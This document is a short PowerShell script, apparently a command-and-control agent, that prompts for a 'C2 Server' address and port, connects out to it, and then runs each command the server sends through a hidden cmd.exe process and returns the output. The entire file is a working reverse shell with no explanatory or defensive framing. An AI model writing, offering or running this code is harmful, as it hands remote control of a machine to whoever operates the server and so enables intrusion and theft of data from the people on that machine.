$InputIP   = Read-Host "Enter C2 Server IP address (e.g., 127.0.0.1)"
$InputPort = Read-Host "Enter C2 Server port (e.g., 4444)"

$port = 0
if ([string]::IsNullOrWhiteSpace($InputIP)) { Exit }
$IP = $InputIP.Trim()
if (-not [int]::TryParse($InputPort.Trim(), [ref]$port) -or $port -lt 1 -or $port -gt 65535) { Exit }

Write-Host "[*] Handshake initialized to $IP`:$port..." -ForegroundColor Yellow

try {
    $Client = New-Object System.Net.Sockets.TcpClient($IP, $port)
    $Stream = $Client.GetStream()
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Reader = New-Object System.IO.StreamReader($Stream)
    $Writer.AutoFlush = $true

    $Writer.WriteLine("Agent Connected Interactively (PID $PID)")

    while ($Client.Connected) {
        $Command = $Reader.ReadLine()
        if ($null -eq $Command -or $Command.Trim() -eq "exit") { break }
        if ([string]::IsNullOrWhiteSpace($Command)) { continue }

        try {
            $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
            $ProcessInfo.FileName = "cmd.exe"
            $ProcessInfo.Arguments = "/c $Command"
            $ProcessInfo.RedirectStandardOutput = $true
            $ProcessInfo.RedirectStandardError = $true
            $ProcessInfo.UseShellExecute = $false
            $ProcessInfo.CreateNoWindow = $true

            $Process = [System.Diagnostics.Process]::Start($ProcessInfo)
            
            $Output = $Process.StandardOutput.ReadToEnd()
            $ErrorOutput = $Process.StandardError.ReadToEnd()
            $Process.WaitForExit()

            $FinalResponse = $Output + $ErrorOutput

            if ([string]::IsNullOrEmpty($FinalResponse)) {
                $FinalResponse = "[+] Command completed with no output sequence.`r`n"
            }

            # Send the real data
            $Writer.Write($FinalResponse)
            if (-not $FinalResponse.EndsWith("`n")) { $Writer.WriteLine() }
            
            # FIX: Append the clean transmission frame flag to flush the server's read block
            $Writer.WriteLine("!!END_OF_TRANSMISSION!!")
        }
        catch {
            $Writer.WriteLine("[!] Local Execution Engine Error: $_")
            $Writer.WriteLine("!!END_OF_TRANSMISSION!!")
        }
    }
}
catch {
    Write-Host "[!] Connection failed." -ForegroundColor Red
}
finally {
    if ($Client) { $Client.Close() }
}
